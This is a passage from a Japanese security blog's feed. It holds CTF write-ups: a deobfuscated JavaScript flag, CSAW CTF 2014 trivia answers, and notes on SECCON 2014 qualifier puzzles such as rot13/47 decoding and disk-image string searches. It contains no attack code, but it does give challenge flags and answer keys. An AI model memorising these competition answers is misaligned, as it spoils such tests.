<pre><code>&gt; var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];
undefined
&gt; _0xee0b
[ 'YOU DID IT! CONGRATS! fwiw, javascript obfuscation is sofa king dumb  :) key{Those Fluffy Bunnies Make Tummy Bumpy}' ]
</code></pre>

<p>というわけで無事にフラグを得ることができました。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CSAW CTF 2014 Quals Trivia]]></title>
    <link href="http://tech.aquarite.info/blog/2014/09/22/csawctf2014-trivia/"/>
    <updated>2014-09-22T20:18:08+09:00</updated>
    <id>http://tech.aquarite.info/blog/2014/09/22/csawctf2014-trivia</id>
    <content type="html"><![CDATA[<p>CSAW CTF 2014 Qualsに参加してました。日本時間で20日07:00から22日07:00までの48時間。都内某所に泊まり込みでした。そんな感じでWrite-upでございます。この記事はTrivia。</p>

<p>Triviaは全て10点で全6問。うち私が解答したのは3問でした。</p>

<h1>Shameless plug</h1>

<h2>問題文</h2>

<p>This is the name of the new USENIX workshop that featured papers on CTFs being used for education.</p>

<h2>解答</h2>

<p>Answer: 3GSE</p>

<p>&ldquo;USENIX workshop CTF&#8221;でググると&#8221;The Fun and Future of CTF | USENIX&#8221;というのが最初に出てきます。このpaperの投稿先が3GSE &lsquo;14でした。</p>

<h1>We don&rsquo;t know either</h1>

<h2>問題文</h2>

<p>On this day in November, the CSAW Career Fair takes place in Brooklyn, New York.</p>

<h2>解答</h2>

<p>Answer: 14</p>

<p>CSAWのページ（CTFでない）に行くとイベントの中にCareer Fairがあります。そのイベントページに行ってRegistrationのリンクを辿るとNov 13 - Nov 15で何かやってるらしいことがわかります。</p>

<h1>Twitter will you give me @kchung?</h1>

<h2>問題文</h2>

<p>This is the Twitter handle of the student who runs CSAW CTF.</p>

<h2>解答</h2>

<p>Answer: poopsec</p>

<p>&ldquo;kchung&#8221;というのはCSAW CTFの中の人のひとり、Kevin Chung氏。ところがTwitterで@kchungは別の誰かが取っています。彼自身がTwitterで使っている名前が答えなのでTwitterのアカウントを探します。</p>

<p>とりあえず&#8221;Kevin Chung&#8221;でググってみると同姓同名の人物のプロフィールやら何やらが見つかりますが、その中にcodekevin.comというサイトがあります。これが彼のWebサイトで、ここにTwitterのホームへのリンクがあります。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SECCON 2014 オンライン予選 その他諸々]]></title>
    <link href="http://tech.aquarite.info/blog/2014/07/20/seccon2014-online-preliminary/"/>
    <updated>2014-07-20T19:24:34+09:00</updated>
    <id>http://tech.aquarite.info/blog/2014/07/20/seccon2014-online-preliminary</id>
    <content type="html"><![CDATA[<p>2014-07-19 09:00 - 21:00に行われたSECCON 2014 オンライン予選について、その他諸々。</p>

<p>個別に書いたのは次の2つ。</p>

<ul>
<li><a href="/blog/2014/07/20/seccon2014-online-amida/">あみだくじ</a></li>
<li><a href="/blog/2014/07/20/seccon2014-online-printit/">Print it</a></li>
</ul>


<p>この2つとここで書かれていないのは問題見てすらいません˙꒳˙</p>

<h2>decode me</h2>

<p>ダウンロードした<code>encoded.txt</code>を見ると盛大に文字化けしてるんだけど、<code>FRPPBA 2014</code>という文字を見た瞬間にここが<code>SECCON 2014</code>であることを確信。ということは換字式暗号か何かなんだろうけど、<code>ebg13/47</code>という文字が気になる。とここで@re_Ordが「rot13/47というのがあるらしい」。なんじゃそりゃと思って調べてみると、rot13を拡張したそういう暗号があるらしかった。</p>

<p>rot13/47はnkfコマンドで簡単に変換出来るので、それを実行しておしまい。</p>

<h2>ソーシャルハック？</h2>

<p>私はページを開いて「天安門事件」って入力したら即座に退出されてしまったのであんまり遊んでません。</p>

<h2>捏造された契約書を暴け</h2>

<p>降ってきたファイルを展開すると<code>Timestamp.dd</code>というファイルが得られる。ここから特定の日付以降になってるようなファイルを探す。日付だから年が入ってるだろうと思って、マウントして云々とかは一切せずに<code>strings Timestamp.dd | grep 2012</code>とかやると1つだけ結果が出てくる。</p>

<p>……で、300点問題だし、まさかそんなわけないよねー、と思ってそれをスルーしてマウントして探し始めたところ、隣で@yuscarletがこの問題を通していた。正解はまさかの先ほど<code>strings</code>やって出てきた日付だったらしい。</p>

<p>よくわかんなくてもとりあえず送信しておくべきですね（白目）</p>

<h2>重ねてみよう</h2>

<p>チーム複数人でまずImageMagickでgif画像を分解して合成云々で粘っていた。これ合成したらQRコードとか出てくるんだろとか思っていたら実際に出てきたのはQRコードでした。</p>

<p>ちなみに、ImageMagickでgif画像を分解、色を反転、透過色を設定……ってやったけどどうにも合成が上手く行ってなかったらしい。で、最終的に取った手段は透過色の設定までやった画像ファイルを全部GIMPに突っ込んでレイヤーとして開き、一番下に白一色のレイヤーを追加するという方法でした。GIMP最強じゃん（</p>

<h2>詰将棋</h2>

<p>突然のurandom将棋部発足。私は何もしてません（</p>

<p>盤面をにらめっこして頭の中で考えるよりも、適当な紙を用意して駒と盤面作った方がよかったようです。</p>

<h2>諸々</h2>

<p>チーム内連携で解けた割と問題があって、今回は結構みんな神が降りていた気がします。ググれる文鎮とは私のことだ！（迫真）</p>

<p>最後の1時間くらい、他のメンバーがDecrypt it!を解いている間に祈っていたら、どうやら全国行けるようです。最後の瞬間のランキングを確認してないんですがひょっとしたらチーム1位かもしれません。やったね。</p>
]]></content>
  </entry>
  
</feed>
